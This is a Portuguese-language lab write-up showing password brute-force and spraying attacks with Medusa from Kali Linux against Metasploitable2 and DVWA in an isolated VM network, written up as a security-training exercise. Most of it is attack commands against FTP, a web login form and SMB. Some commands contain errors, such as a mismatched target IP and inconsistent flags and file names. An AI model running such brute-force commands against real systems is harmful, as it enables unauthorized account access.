<h1>Lab: Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux</h1>

**Autor:** Wanderson Gomes<br>
**Data:** 2025-10-03

<h1>Objetivo</h1> <br> 

* Ao concluir este desafio, você será capaz de: <br>
* Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB);<br>
* Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado;<br>
* Documentar processos técnicos de forma clara e estruturada;<br>
* Reconhecer vulnerabilidades comuns e propor medidas de mitigação;<br>
* Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências.<br>

<h1>Pré-requisitos</h1>

* Host com VirtualBox (ou similar).
* Imagens VM:
  - Kali Linux (atacante) — versão atual do Kali.
  - Metasploitable2 (alvo) — já contém serviços vulneráveis; tem DVWA por padrão em alguns builds.
* Ferramentas (em Kali): medusa, hydra, nmap, smbclient...
* Rede isolada: Host-Only no VirtualBox.
* Permissão explícita para executar testes.

<h1>Arquitetura do Lab</h1>

* Kali (atacante) — 192.168.56.101
* Metasploitable2 (alvo) — 192.168.56.102
* Rede: VirtualBox Host-Only

<h1>Execução — comandos principais</h1>

**1. Scan Inicial** <br>

````
nmap -sV -p 21,22,80,445,139 192.168.26.102
````
**2. Força-bruta FTP (Medusa)** <br>
Criando arquivos de Usuário:
````
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
````
Criando arquivos de Senhas:
````
echo -e "1234\npassword\nqwerty\nmsfadmin" > pass.txt
````
Aplicando força bruta:
````
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
````
**3.Brute-force de formulário web (DVWA) (medusa)** <br>
````
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login Failed'
````
**4. Password-spraying SMB (Medusa — smbnt)**
Enumerar usuário existentes:
````
enum4linux - 192.168.56.102 | tee enum4output.txt
````
Ler TXT gerado:
````
less enum4output.txt
````
Criando arquivos de Usuário:
````
echo -e "user\nmsfadmin\service" > smb_users.txt
````
Criando arquivos de Senhas:
````
echo -e "1password\n123456\nWelcome123\nmsfadmin" > Senhas_spray.txt
````
Aplicando força bruta com Spray:
````
medusa -h 192.168.56.102 -U smb_users.txt -p senhas_spray.txt -M smbnt -t 2 -T 50
````

OBRIGADO!
